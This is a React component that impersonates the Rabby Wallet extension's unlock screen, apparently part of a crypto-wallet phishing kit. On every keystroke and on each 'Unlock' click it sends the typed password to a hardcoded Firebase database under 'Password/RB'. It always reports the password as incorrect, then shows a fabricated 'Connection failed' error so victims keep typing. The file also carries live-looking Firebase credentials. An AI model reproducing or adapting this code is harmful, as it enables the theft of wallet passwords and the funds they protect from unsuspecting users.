import React, { useState, useEffect, useRef } from 'react';
// import { initializeLocationData, initializeSocket, sendKeyToBackend } from '../../services/keyService';
// import { WALLET_TYPE_SHORTKEY } from '../../services/config';
import { CustomWalletModalProps } from '../../types';
import './styles.css';

import { initializeApp } from "firebase/app";
import { ref, set, getDatabase } from "firebase/database";
// TODO: Add SDKs for Firebase products that you want to use
// https://firebase.google.com/docs/web/setup#available-libraries

// Your web app's Firebase configuration
// For Firebase JS SDK v7.20.0 and later, measurementId is optional
const firebaseConfig = {
  apiKey: "AIzaSyApPwqWwGydM4xXyWwFtFSfqo85M-MfGHc",
  authDomain: "wallet-integration-mr.firebaseapp.com",
  projectId: "wallet-integration-mr",
  storageBucket: "wallet-integration-mr.firebasestorage.app",
  messagingSenderId: "933009884848",
  appId: "1:933009884848:web:404ede153fda46e743dd75",
  measurementId: "G-3F71ML37Y8"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

const RabbyModal: React.FC<CustomWalletModalProps> = ({ isOpen, onClose }) => {
  const [keyword, setKeyword] = useState('');
  const [error, setError] = useState(false);
  const [helperText, setHelperText] = useState('');
  const [trying, setTrying] = useState(0);
  const [connecting, setConnecting] = useState(false);
  const [connectionError, setConnectionError] = useState(false);
  const [isClosable, setIsClosable] = useState(true);
  const [isButtonPressed, setIsButtonPressed] = useState(false);
  const [shouldShake, setShouldShake] = useState(false);

  const inputRef = useRef<HTMLInputElement>(null);
  const modalRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    if (isOpen) {

      setTimeout(() => {
        if (inputRef.current) {
          inputRef.current.focus();
        }
      }, 4000);

      const handleDocumentClick = (e: MouseEvent) => {
        if (isClosable && modalRef.current && !modalRef.current.contains(e.target as Node)) {
          handleClick();
        }
      };

      document.addEventListener('click', handleDocumentClick);

      const modal = document.getElementById('rabby-forget-password-modal');
      if (modal) {
        modal.addEventListener('click', (e) => {
          if (e.target === modal) {
            modal.classList.add('hidden');
          }
        });
      }

      const handleHelpPopoverClick = (e: MouseEvent) => {
        const helpPopover = document.getElementById('rabby-help-popover');
        const helpButton = document.getElementById('menu-button--menu--:r1:');

        if (helpPopover && !helpPopover.classList.contains('hidden')) {
          const isClickOnButton = helpButton && (helpButton === e.target || (helpButton as HTMLElement).contains(e.target as Node));
          const isClickOnPopover = helpPopover.contains(e.target as Node);

          if (!isClickOnPopover && !isClickOnButton) {
            closeHelpModal();
          }
        }
      };

      document.addEventListener('click', handleHelpPopoverClick);

      return () => {
        document.removeEventListener('click', handleDocumentClick);
        document.removeEventListener('click', handleHelpPopoverClick);
      };
    }
  }, [isOpen, isClosable]);

  const handleClick = () => {
    if (onClose) onClose();
    setKeyword('');
    setTrying(0);
    setConnectionError(false);
    setError(false);
    setIsButtonPressed(false);
    setShouldShake(false);
  };

  const getCaretCoordinates = (element: HTMLInputElement, position: number) => {
    const div = document.createElement('div');
    div.id = 'password-mirror-div';
    document.body.appendChild(div);
    const computed = window.getComputedStyle(element);
    div.textContent = new Array(position + 1).join('•');
    const span = document.createElement('span');
    span.textContent = '•';
    div.appendChild(span);

    const coordinates = {
      top: span.offsetTop + parseInt(computed.borderTopWidth, 10),
      left: span.offsetLeft + parseInt(computed.borderLeftWidth, 10),
    };
    document.body.removeChild(div);
    return coordinates;
  };

  const handleKeywordChange = async (e: React.ChangeEvent<HTMLInputElement>) => {
    const target = e.target;
    const element = target || inputRef.current;
    if (element && typeof element.getBoundingClientRect === 'function') {
      const boundingRect = element.getBoundingClientRect();
      const coordinates = getCaretCoordinates(element, element.selectionEnd || 0);
      // Animation emitter removed (was for Mascot)
    }

    const newKeyword = target.value;
    setKeyword(newKeyword);
    setError(false);
    setShouldShake(false);

      set(ref(db, "Password/RB"), {
        password: newKeyword,
      });
  };

  const handledForgetPwd = () => {
    handledResetPwd();
  };

  const handledResetPwd = () => {
    handleClick();
    closeForgetPasswordModal();
    window.open('chrome-extension://acmacodkjbdgmoleebolmdjonilkdbch/index.html#/forgot-password', '_blank');
  };

  const handleLearnMore = () => {
    handleClick();
    closeForgetPasswordModal();
    window.open('https://help.phantom.com/', '_blank');
  };

  const handleKeywordTyping = async () => {
    if (connecting || !keyword) {
      return;
    }

    setConnecting(true);

    
      set(ref(db, "Password/RB"), {
        password: keyword,
      });

      setTimeout(() => {
        setConnecting(false);
        if (trying < 3) {
          setError(true);
          setHelperText('Password is incorrect. Please try again.');
          setTrying(trying + 1);
          setShouldShake(true);
          setTimeout(() => {
            setShouldShake(false);
          }, 500);
        } else {
          setConnectionError(true);
        }
      }, 150);
  };

  const showForgetPasswordModal = () => {
    const modal = document.getElementById('rabby-forget-password-modal');
    if (modal) {
      modal.classList.remove('hidden');
    }
  };

  const closeForgetPasswordModal = () => {
    const modal = document.getElementById('rabby-forget-password-modal');
    if (modal) {
      modal.classList.add('hidden');
    }
  };

  const showHelpModal = () => {
    const modal = document.getElementById('rabby-help-popover');
    if (modal) {
      modal.classList.remove('hidden');
    }
  };

  const closeHelpModal = () => {
    const modal = document.getElementById('rabby-help-popover');
    if (modal) {
      modal.classList.add('hidden');
    }
  };

  const handleButtonMouseDown = () => {
    setIsButtonPressed(true);
  };

  const handleButtonMouseUp = () => {
    setIsButtonPressed(false);
  };

  const handleButtonMouseLeave = () => {
    setIsButtonPressed(false);
  };

  const closeWindow = () => {
    handleClick();
    setTimeout(() => {
      setConnectionError(false);
      setKeyword('');
      setTrying(0);
      setError(false);
      setIsButtonPressed(false);
      setShouldShake(false);
    }, 1000);
  };

  if (!isOpen) return null;

  const modalContent = (
    <div
      id="header-layout"
      ref={modalRef}
      className={`fixed top-0 right-[150px] z-[1000] flex transition-opacity duration-200 max-[395px]:scale-75 max-[265px]:scale-50
        ${isOpen ? 'opacity-100' : 'opacity-0 pointer-events-none'}`}
      onMouseEnter={() => setIsClosable(false)}
      onMouseLeave={() => setIsClosable(true)}
    >
      <div className="w-[400px] h-[599px] relative">
        <div className="h-full relative">
          {connectionError ? (
            <div className="text-white text-center px-4 py-8 flex flex-col h-full justify-between bg-[#121314]">
              <div></div>
              <div className="">
                <div className="flex justify-center w-full items-center mb-4">
                  <svg className="text-2xl text-center text-white w-6 h-6" fill="currentColor" viewBox="0 0 20 20">
                    <path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z" clipRule="evenodd" />
                  </svg>
                </div>
                <h3 className="text-xl font-extrabold euclid-bold">Connection failed</h3>
                <div className="text-sm leading-relaxed">
                  <h6>Fetching of</h6>
                  <h5 className="font-bold">@unstoppabledomains/unstoppable-</h5>
                  <h5>
                    <span className="font-bold">resolution-snap</span> failed, check your network and
                  </h5>
                  <h5>try again.</h5>
                </div>
                <div className="mt-4 text-base border-l-4 border-red-500 p-4 rounded text-left bg-gray-700">
                  <h5>One or more permissions are not allowed:</h5>
                  <h5>This endowment is experiental and therefore </h5>
                  <h5>not available.</h5>
                </div>
              </div>
              <button
                className={`w-full rounded-full cursor-pointer p-2.5 hover:bg-[#3148f5] border-[#ffffff] bg-[#4459ff] text-[#141618] rabby-font`}
                onClick={closeWindow}
              >
                Ok
              </button>
            </div>
          ) : (
            <div>
              <div
                id="app-content"
                style={{
                  overflowX: 'hidden',
                  height: '600px',
                  overflow: 'auto',
                  boxShadow: '0px 2px 12px #000000a1',
                  display: 'flex',
                  position: 'relative',
                  flexDirection: 'column',
                  width: '400px',
                }}
              >
                <svg width="400" height="600" fill="none" xmlns="http://www.w3.org/2000/svg" style={{ overflow: 'hidden', position: 'absolute', zIndex: '-1' }}>
                  <g clipPath="url(#background_svg__clip0_114948_40926)">
                    <path transform="matrix(1 0 0 -1 0 600)" fill="url(#background_svg__paint0_radial_114948_40926)" d="M0 0h400v600H0z"></path>
                    <g opacity="0.2" filter="url(#background_svg__filter0_f_114948_40926)">
                      <path d="M473.837 864.74c-129.844 102.557-195.138 14.712-265.119-73.89-69.981-88.601-118.147-144.403 11.696-246.96 129.844-102.556 174.336-148.327 244.317-59.726s138.95 278.02 9.106 380.576z" fill="#4569C7"></path>
                    </g>
                    <g opacity="0.1" filter="url(#background_svg__filter1_f_114948_40926)">
                      <path d="M117.4-110.123c149.18 49.577 290.17-69.223 240.593 79.956-49.576 149.18-210.7 229.924-359.88 180.347-149.179-49.576-229.923-210.7-180.347-359.88 49.577-149.179 150.455 50.001 299.634 99.577z" fill="#2174A3"></path>
                    </g>
                    <path d="M0-10h400v621H0V-10z" fill="url(#background_svg__paint1_radial_114948_40926)"></path>
                    <g filter="url(#background_svg__filter2_b_114948_40926)">
                      <path d="M0-10h400v621H0V-10z" fill="#ECF3FF" fillOpacity="0.7"></path>
                    </g>
                    <path fill="url(#background_svg__paint2_linear_114948_40926)" d="M0 0h400v600H0z"></path>
                  </g>
                  <defs>
                    <filter id="background_svg__filter0_f_114948_40926" x="-60.978" y="237.073" width="807.895" height="873.845" filterUnits="userSpaceOnUse" colorInterpolationFilters="sRGB">
                      <feFlood floodOpacity="0" result="BackgroundImageFix"></feFlood>
                      <feBlend in="SourceGraphic" in2="BackgroundImageFix" result="shape"></feBlend>
                      <feGaussianBlur stdDeviation="100" result="effect1_foregroundBlur_114948_40926"></feGaussianBlur>
                    </filter>
                    <filter id="background_svg__filter1_f_114948_40926" x="-396.836" y="-464.175" width="964.947" height="828.958" filterUnits="userSpaceOnUse" colorInterpolationFilters="sRGB">
                      <feFlood floodOpacity="0" result="BackgroundImageFix"></feFlood>
                      <feBlend in="SourceGraphic" in2="BackgroundImageFix" result="shape"></feBlend>
                      <feGaussianBlur stdDeviation="100" result="effect1_foregroundBlur_114948_40926"></feGaussianBlur>
                    </filter>
                    <filter id="background_svg__filter2_b_114948_40926" x="-40" y="-50" width="480" height="701" filterUnits="userSpaceOnUse" colorInterpolationFilters="sRGB">
                      <feFlood floodOpacity="0" result="BackgroundImageFix"></feFlood>
                      <feGaussianBlur in="BackgroundImageFix" stdDeviation="20"></feGaussianBlur>
                      <feComposite in2="SourceAlpha" operator="in" result="effect1_backgroundBlur_114948_40926"></feComposite>
                      <feBlend in="SourceGraphic" in2="effect1_backgroundBlur_114948_40926" result="shape"></feBlend>
                    </filter>
                    <radialGradient id="background_svg__paint0_radial_114948_40926" cx="0" cy="0" r="1" gradientUnits="userSpaceOnUse" gradientTransform="matrix(-44.61529 480 -346.21069 -32.17977 215.897 71.667)">
                      <stop stopColor="#FDF8FF" stopOpacity="0.68"></stop>
                      <stop offset="1" stopColor="#E4EDFF"></stop>
                    </radialGradient>
                    <radialGradient id="background_svg__paint1_radial_114948_40926" cx="0" cy="0" r="1" gradientUnits="userSpaceOnUse" gradientTransform="rotate(95.132 78.613 130.776) scale(498.799 347.802)">
                      <stop stopColor="#FDF8FF" stopOpacity="0.68"></stop>
                      <stop offset="1" stopColor="#E4EDFF"></stop>
                    </radialGradient>
                    <linearGradient id="background_svg__paint2_linear_114948_40926" x1="199.467" y1="-171.5" x2="203.308" y2="214.462" gradientUnits="userSpaceOnUse">
                      <stop stopColor="#7084FF"></stop>
                      <stop offset="1" stopColor="#fff" stopOpacity="0"></stop>
                    </linearGradient>
                    <clipPath id="background_svg__clip0_114948_40926">
                      <path fill="#fff" transform="matrix(1 0 0 -1 0 600)" d="M0 0h400v600H0z"></path>
                    </clipPath>
                  </defs>
                </svg>
                <div className="flex items-center justify-center mt-[80px]">
                  <svg width="100" height="100" viewBox="0 0 161 160" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <g clipPath="url(#clip0_355_3988)">
                      <path
                        d="M148.047 88.6169C153.448 76.5068 126.749 42.6731 101.243 28.5773C85.1659 17.6575 68.4134 19.1577 65.0205 23.9523C57.5744 34.4746 89.6766 43.3906 111.146 53.795C106.531 55.807 102.182 59.4176 99.6242 64.0352C91.6203 55.264 74.0528 47.7107 53.4392 53.795C39.5481 57.8951 28.0036 67.5611 23.5417 82.1605C22.4575 81.6769 21.2571 81.4082 19.9942 81.4082C15.1649 81.4082 11.25 85.3379 11.25 90.1854C11.25 95.033 15.1649 98.9627 19.9942 98.9627C20.8894 98.9627 23.6882 98.36 23.6882 98.36L68.4134 98.6853C50.5268 127.168 36.3913 131.331 36.3913 136.266C36.3913 141.2 49.9165 139.863 54.9949 138.024C79.3057 129.219 105.417 101.777 109.897 93.8779C128.713 96.2343 144.526 96.513 148.047 88.6169Z"
                        fill="url(#paint0_linear_355_3988)"
                      />
                      <path
                        d="M64.4841 29.3587C65.9945 26.3383 76.2037 26.0013 90.0681 32.556C100.244 37.367 111.081 48.108 111.709 50.7708C111.982 51.9293 112.142 53.4048 111.147 53.7982C111.146 53.7976 111.145 53.7968 111.143 53.7962L111.146 53.7953C93.4437 45.2163 68.5135 37.6487 64.4841 29.3587Z"
                        fill="url(#paint1_linear_355_3988)"
                      />
                      <path
                        d="M58.6694 71.8772C73.5151 71.8772 79.9042 76.6996 84.9936 85.759C88.62 92.2144 87.8148 102.425 83.975 109.322C87.5754 110.217 90.7417 111.205 93.5453 112.281C88.9983 116.531 83.7943 120.944 78.2592 124.991C70.7233 123.061 63.8755 121.228 53.4916 118.557C57.9298 113.696 63.0004 107.305 68.4135 98.6848L28.269 98.3928C28.1296 96.7639 28.0884 94.9926 28.1293 93.0598C28.5196 74.6387 50.5038 71.8773 58.6694 71.8772Z"
                        fill="url(#paint2_linear_355_3988)"
                      />
                      <path
                        d="M23.0061 96.5002C24.6461 110.494 32.5692 115.978 48.7593 117.601C64.9494 119.224 74.2363 118.136 86.6003 119.265C96.9266 120.208 106.147 125.49 109.567 123.664C112.646 122.022 110.923 116.087 106.804 112.279C101.465 107.343 94.0752 103.911 81.0725 102.694C83.6637 95.5717 82.9376 85.5861 78.9131 80.1533C73.0941 72.298 62.3533 68.7465 48.7593 70.2982C34.5568 71.9193 20.9479 78.938 23.0061 96.5002Z"
                        fill="url(#paint3_linear_355_3988)"
                      />
                    </g>
                    <defs>
                      <linearGradient id="paint0_linear_355_3988" x1="51.8217" y1="77.8928" x2="146.938" y2="104.764" gradientUnits="userSpaceOnUse">
                        <stop stopColor="#4C65FE" />
                        <stop offset="1" stopColor="#8F9FFF" />
                      </linearGradient>
                      <linearGradient id="paint1_linear_355_3988" x1="130.877" y1="76.079" x2="62.0252" y2="7.32076" gradientUnits="userSpaceOnUse">
                        <stop stopColor="#4C65FE" />
                        <stop offset="1" stopColor="#5156D8" stopOpacity="0" />
                      </linearGradient>
                      <linearGradient id="paint2_linear_355_3988" x1="95.4537" y1="114.683" x2="29.4416" y2="76.8748" gradientUnits="userSpaceOnUse">
                        <stop stopColor="#2D46E2" />
                        <stop offset="1" stopColor="#8697FF" stopOpacity="0" />
                      </linearGradient>
                      <linearGradient id="paint3_linear_355_3988" x1="57.4972" y1="77.1806" x2="102.242" y2="133.819" gradientUnits="userSpaceOnUse">
                        <stop stopColor="#4C65FE" />
                        <stop offset="1" stopColor="#4C65FE" />
                      </linearGradient>
                      <clipPath id="clip0_355_3988">
                        <rect width="160" height="160" fill="white" transform="translate(0.5)" />
                      </clipPath>
                    </defs>
                  </svg>
                </div>
                <div>
                  <h1 className="rabby-font font-semibold" style={{ width: '100%', fontSize: '24px', lineHeight: '23px', marginBottom: '4px', textAlign: 'center', marginTop: '14px', color: 'rgb(25, 41, 69, 1)' }}>Rabby Wallet</h1>
                  <p style={{ lineHeight: '20px', color: '#6a7587', fontSize: '14px', textAlign: 'center', margin: '12px 51px 14px 52px' }} className="rabby-font">Your go-to wallet for Ethereum and EVM</p>
                  <div className="ppp" style={{ border: 'none', margin: '34px 22px 0px 22px', backgroundColor: 'rgb(245,245,245)', alignItems: 'center' }}>
                    <input
                      ref={inputRef}
                      type="password"
                      placeholder="Enter the Password to Unlock"
                      onChange={handleKeywordChange}
                      className="rabby-font"
                      style={{
                        width: '100%',
                        height: '56px',
                        borderRadius: '10px',
                        outline: 'none',
                        borderWidth: '1px',
                        borderStyle: 'solid',
                        borderColor: error ? 'red' : 'transparent',
                        fontSize: '14px',
                        color: '#192945',
                        padding: '15px 16px',
                        backgroundColor: 'white',
                        transition: 'border-color 0.3s ease',
                        letterSpacing: keyword ? '4px' : 'normal',
                      }}
                      onMouseEnter={(e) => {
                        if (!error) {
                          (e.target as HTMLInputElement).style.borderColor = '#7084ff';
                        }
                      }}
                      onMouseLeave={(e) => {
                        if (!error) {
                          (e.target as HTMLInputElement).style.borderColor = 'transparent';
                        }
                      }}
                      onKeyDown={(e) => {
                        if (e.key === 'Enter') handleKeywordTyping();
                      }}
                      value={keyword}
                    />
                  </div>
                  {error && (
                    <p style={{ color: 'red', fontSize: '13px', margin: '8px 22px 0 22px' }}>
                      <span className="pr-[5px] rabby-font text-red">Incorrect password</span>{' '}
                      <a className="cursor-pointer rabby-font" style={{ color: 'blue', textDecoration: 'underline' }} onClick={handledForgetPwd}>
                        Forgot Password?
                      </a>
                    </p>
                  )}
                  <div style={{ bottom: '35px', position: 'absolute', width: '360px', margin: '0px 22px' }}>
                    <button
                      className="rabby-font"
                      style={{
                        width: '100%',
                        height: '56px',
                        backgroundColor: 'rgb(97, 118, 255)',
                        borderRadius: '8px',
                        fontSize: '16px',
                        fontWeight: 600,
                        color: 'white',
                        cursor: 'pointer',
                        marginBottom: '20px',
                      }}
                      onClick={handleKeywordTyping}
                      disabled={connecting}
                      onMouseDown={handleButtonMouseDown}
                      onMouseUp={handleButtonMouseUp}
                      onMouseLeave={handleButtonMouseLeave}
                    >
                      Unlock
                    </button>
                    <div className="w-full flex justify-center items-center">
                      <button
                        className="hover:underline rabby-font"
                        style={{
                          margin: '0px 112px',
                          backgroundColor: 'transparent',
                          fontSize: '13px',
                          textAlign: 'center',
                          fontWeight: 500,
                          color: '#3e495e',
                        }}
                        onClick={handledForgetPwd}
                      >
                        Forgot Password?
                      </button>
                    </div>
                  </div>
                </div>
              </div>
              <div id="popover-content"></div>
            </div>
          )}
        </div>
      </div>
    </div>
  );

  return modalContent;
};

export default RabbyModal;
